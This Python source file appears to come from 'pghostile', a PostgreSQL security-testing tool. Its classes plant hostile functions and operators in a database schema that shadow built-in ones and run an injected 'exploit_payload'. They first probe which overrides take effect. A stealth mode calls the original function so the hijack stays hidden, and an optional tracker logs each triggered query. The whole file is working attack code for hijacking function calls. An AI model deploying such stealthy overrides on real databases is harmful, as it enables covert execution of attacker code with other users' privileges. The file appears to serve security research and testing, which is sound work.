# Copyright (c) 2022 Aiven, Helsinki, Finland. https://aiven.io
import json
import psycopg2
from core.utils import convert_rettype, pgtype_get_names_map, get_test_value_for_type, expand_matrix
from core.constants import Constants


class DBOperatorOverride:
    def __init__(self, name, dbfunction_override):
        self.created = False
        self.db = dbfunction_override.db
        self.name = name
        self.params_type_name = dbfunction_override.params_type_name
        self.function_name = dbfunction_override.name
        self.test_params_combinations = dbfunction_override.test_params_combinations
        self.create_query = f"""
            CREATE OPERATOR {Constants.DESTINATON_SCHEMA}.{self.name}(
                leftarg = {self.params_type_name[0]},
                rightarg = {self.params_type_name[1]},
                function = {Constants.DESTINATON_SCHEMA}.{self.function_name}
            )
        """
        self.drop_query = f"""
            drop operator {Constants.DESTINATON_SCHEMA}.{self.name}({self.params_type_name[0]}, {self.params_type_name[1]})
        """

        self.test_queries = []
        for pars in self.test_params_combinations:
            self.test_queries.append("select %s %s %s" % (pars[0], self.name, pars[1]))

    def delete(self):
        try:
            self.db.query(self.drop_query)
            self.created = False
        except psycopg2.errors.Error:
            pass

    def create(self):
        # @TODO
        # For now, we just skip operator that deal with text
        if self.params_type_name[0] == "text" or self.params_type_name[0] == "text":
            return False
        self.delete()
        try:
            self.db.query(self.create_query)
            self.created = True
        except psycopg2.errors.Error:
            return False


class DBFunctionOverride:
    def __init__(self, dbfunction, params_type, exploit_payload, stealth_mode=True, track_execution=False):
        pg_type_names = pgtype_get_names_map()
        self.dbfunction = dbfunction
        self.db = dbfunction.db
        self.name = dbfunction.name
        self.params_type = params_type
        self.initial_params_type = dbfunction.params_type
        self.nparams = len(self.params_type)
        self.initial_rettype = dbfunction.rettype
        self.rettype = convert_rettype(self.initial_rettype)
        self.rettype_name = pg_type_names[self.rettype]
        self.exploit_payload = exploit_payload
        self.stealth_mode = stealth_mode
        self.created = False
        self.test_ok = False
        self.test_failure_message = None
        self.tested_queries = []
        self.tested_queries_operator = []
        self.oid = None
        self.params_type_name = []

        test_params = []
        callargs = []
        for i in range(0, self.nparams):
            self.params_type_name.append(pg_type_names[self.params_type[i]])
            rtypecast = pg_type_names[self.initial_params_type[i]]
            # do not cast internal or the 'any' types
            if rtypecast == "internal" or rtypecast.startswith("any"):
                callargs.append("$%s" % (i + 1))
            else:
                callargs.append("$%s::%s" % (i + 1, rtypecast))
            test_params.append(get_test_value_for_type(self.initial_params_type[i]))

        self.test_params_combinations = expand_matrix([test_params])
        if dbfunction.operator:
            self.operator = DBOperatorOverride(dbfunction.operator, self)
        else:
            self.operator = None
        self.definition = "%s(%s)" % (self.name, ", ".join(self.params_type_name))
        self.wrapped_function_call = "%s.%s(%s)" % (Constants.SOURCE_SCHEMA, self.name, ", ".join(callargs))

        if track_execution:
            self.execution_tracker = """
                insert into pghostile.triggers (fname, params, current_query) values ('%s', '%s', pg_catalog.current_query());
            """ % (self.name, json.dumps(self.params_type_name))
        else:
            self.execution_tracker = ""

        self.drop_query = "drop function %s.%s" % (Constants.DESTINATON_SCHEMA, self.definition)
        self.test_queries = []
        for pars in self.test_params_combinations:
            self.test_queries.append("select %s(%s)" % (self.name, ", ".join(pars)))

        self.create_query_test = self._create_function_query("", "create table pg_temp.___pghostile_test_wrapper(a integer);")
        self.create_query_exploit = self._create_function_query(self.execution_tracker, self.exploit_payload)

    def _create_function_query(self, tracker, payload):
        if self.stealth_mode:
            base_qry = f"""
                create function {Constants.DESTINATON_SCHEMA}.{self.definition}
                returns {self.rettype_name} as
                $$
                    %s%s
                    select {self.wrapped_function_call};
                $$
                language sql;
            """
        else:
            base_qry = f"""
                create function {Constants.DESTINATON_SCHEMA}.{self.definition}
                returns integer as
                $$
                    %s%s
                    select 1;
                $$
                language sql;
            """

        return base_qry % (tracker, payload)

    def _test_query(self, query):
        try:
            self.db.query("drop table if exists pg_temp.___pghostile_test_wrapper")
            self.db.query(query)
            self.db.query("select * from pg_temp.___pghostile_test_wrapper")
            self.db.query("drop table pg_temp.___pghostile_test_wrapper")
        except psycopg2.errors.Error:
            return False
        return True

    def run_test(self):
        self.tested_queries = []
        self.tested_queries_operator = []
        try:
            if self.operator:
                self.operator.delete()
            self.db.query(self.drop_query)
        except psycopg2.errors.Error:
            pass
        try:
            self.db.query(self.create_query_test)
        except psycopg2.errors.Error as e:
            self.test_ok = False
            self.test_failure_message = "Database error while creating test function: %s" % e
            return False

        for qry in self.test_queries:
            if self._test_query(qry):
                self.tested_queries.append(qry)

        if self.operator:
            self.operator.create()
            for qry in self.operator.test_queries:
                if self._test_query(qry):
                    self.tested_queries_operator.append(qry)
            self.operator.delete()

        try:
            self.db.query(self.drop_query)
        except psycopg2.errors.Error as e:
            raise Exception("Database error while deleting test function: %s" % e)

        if len(self.tested_queries) == 0:
            self.test_failure_message = "No valid queries found"
            return False

        return True

    def create_exploit_function(self):
        if self.operator:
            self.operator.delete()
        try:
            self.db.query(self.drop_query)
        except psycopg2.errors.Error:
            pass
        try:
            self.db.query(self.create_query_exploit)
            self.created = True
            if self.operator:
                self.operator.create()
        except psycopg2.errors.Error as e:
            raise Exception("Database error while creating exploit function: %s" % e)

    def get_oid(self):
        if self.oid:
            return self.oid
        qry = """
            SELECT p.oid as oid FROM pg_catalog.pg_namespace n JOIN pg_catalog.pg_proc p ON p.pronamespace = n.oid
            WHERE p.prokind = 'f' and n.nspname = %s and p.proname = %s and p.proargtypes = %s::oidvector
        """
        try:
            res = self.db.query(qry, (Constants.DESTINATON_SCHEMA, self.name, self.params_type))
            row = res.fetchone()
            if not row:
                return None
            self.oid = row['oid']
            return self.oid
        except psycopg2.errors.Error as e:
            raise e

    def exists(self):
        return self.get_oid() is not None

    def __str__(self):
        return self.definition

    def __eq__(self, o):
        return self.definition == o.definition
